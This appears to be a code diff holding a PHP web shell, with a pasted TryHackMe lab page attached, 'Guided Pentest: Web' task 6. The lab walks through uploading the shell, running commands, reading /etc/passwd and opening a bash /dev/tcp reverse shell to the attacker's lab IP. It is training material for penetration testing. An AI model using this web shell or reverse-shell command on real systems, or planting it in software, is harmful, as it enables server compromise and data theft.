@@ -5,3 +5,218 @@ if(isset($_GET['cmd'])) {
     echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
 }
 ?>
+
+
+
+Skip to main content
+TryHackMe logo.
+Dashboard
+
+Learn
+
+
+Practice
+
+
+Compete
+
+
+6
+
+30
+
+5
+
+
+User profile photo.
+
+Jr Penetration Tester
+Penetration Testing Foundations
+Guided Pentest: Web
+Room Icon
+Guided Pentest: Web
+Learn web app pentesting by chaining vulnerabilities from recon to full server compromise.
+
+
+User profile photo.
+60 min
+
+100,949
+
+User profile photo.
+User profile photo.
+User profile photo.
+Show Split View
+
+AttackBox Connecting
+
+Save Room
+
+1323 Recommend
+
+Connectivity
+Options
+Room progress: 64%
+Active machines information
+AttackBox machine.IP Address:
+10.48.105.178
+Lab machine.IP Address:
+10.48.160.100
+Network diagram showing machine connections
+Attacker machineInformation.
+Status:
+Connected via AttackBox
+Your machine IP Address:
+10.48.105.178
+
+Terminate
+Lab machineInformation.
+Status:
+On
+Title:
+guided_pentestv2.1
+Target IP Address:
+10.48.160.100
+
+Expires:
+30min 57s
+
+Add 1 hour
+Terminate
+
+Task 1
+Introduction
+
+Task 2
+Reconnaissance and Enumeration
+
+Task 3
+IDOR
+
+Task 4
+Weak Password Reset
+
+Task 5
+Admin Panel Access
+
+Task 6
+Remote Code Execution
+We have confirmed that we can upload PHP files to the server and that the server will execute them. This is the point in the penetration test where all the previous steps come together. We started with nothing, no credentials, no knowledge of the application. Through enumeration, IDOR exploitation, password reset abuse, and admin panel access, we have reached a position where we can execute arbitrary code on the server.
+
+Creating a Web Shell
+A web shell is a small script that accepts commands through HTTP parameters and executes them on the server. Let's create a simple one and save it as shell.phtml:
+
+
+<?php
+if(isset($_GET['cmd'])) {
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+}
+?>
+This script checks for a cmd parameter in the URL. If present, it passes the value to shell_exec(), which runs the command on the operating system and returns the output. Upload the file on the Admin panel http://10.48.160.100/admin/upload.php.
+
+Executing Commands
+Let's verify we have code execution by running a simple command:
+
+
+Terminal
+root@tryhackme:~# curl "http://10.48.160.100/uploads/documents/shell.phtml?cmd=whoami"
+<pre>www-data</pre>
+root@tryhackme:~# curl "http://10.48.160.100/uploads/documents/shell.phtml?cmd=id"
+<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+We have remote code execution. The commands are running as www-data, which is the default user for the Apache web server on Ubuntu. Let's gather more information about the system:
+
+
+Terminal
+root@tryhackme:~# curl "http://10.48.160.100/uploads/documents/shell.phtml?cmd=hostname"
+<pre>example-hostame</pre>
+root@tryhackme:~# curl "http://10.48.160.100/uploads/documents/shell.phtml?cmd=uname+-a"
+<pre>Linux example-hostame 6.8.0-1017-aws #18-Ubuntu SMP Wed Oct  2 20:17:03 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</pre>
+We can now see the hostname, kernel version, and execute any command on the system.
+
+Reading Sensitive Files
+Since we can read files on the server, a good first step is to check system files that list users. In Linux, /etc/passwd contains basic account information:
+
+
+Terminal
+root@tryhackme:~# curl "http://10.48.160.100/uploads/documents/shell.phtml?cmd=cat+/etc/passwd" | grep -v "nologin"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2088  100  2088    0     0   398k      0 --:--:-- --:--:-- --:--:--  407k
+<pre>root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+mysql:x:115:123:MySQL Server,,,:/nonexistent:/bin/false
+</pre>
+By utilising our web shell, we accessed /etc/passwd and identified system users. In a real-world scenario, this level of access would enable further enumeration of configuration files to extract database credentials and gain full access to the application's backend data.
+
+Obtaining a Reverse Shell
+A web shell works, but it is limited; each command is a separate HTTP request, there is no interactive session, and complex commands with special characters can be difficult to pass through URL parameters. Let's upgrade to a proper reverse shell.
+
+First, set up a listener on your AttackBox:
+
+
+Terminal
+root@tryhackme:~# nc -lvnp 4444
+listening on [any] 4444 ...
+In a second terminal, trigger the reverse shell through the web shell. We will URL-encode the payload to avoid issues with special characters:
+
+
+Terminal
+root@tryhackme:~# curl "http://10.48.160.100/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.48.105.178/4444+0>%261'"
+Back in your listener terminal:
+
+
+Terminal
+root@tryhackme:~# nc -lvnp 4444
+listening on [any] 4444 ...
+Connection received on 10.48.105.178 48268
+www-data@example-hostame:/var/www/html/uploads/documents$ whoami
+www-data
+www-data@example-hostame:/var/www/uploads/documents$ 
+We now have an interactive shell on the target server. From here, a penetration tester would typically proceed to local enumeration and privilege escalation, but that is beyond the scope of this room.
+
+Reading the Flag
+To confirm you have completed the engagement, read the flag file on the system:
+
+
+Terminal
+www-data@example-hostame:~$ cat /var/www/flag.txt
+{REDACTED}
+Answer the questions below
+What user is the web shell running as?
+
+________
+
+Check
+What is the hostname of the target server?
+
+_____________
+
+Check
+What is the flag?
+
+___{_____________________________}
+
+Check
+
+Task 7
+The Attack Chain
+
+Task 8
+Conclusion
+How likely are you to recommend this room to others?
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+Submit now
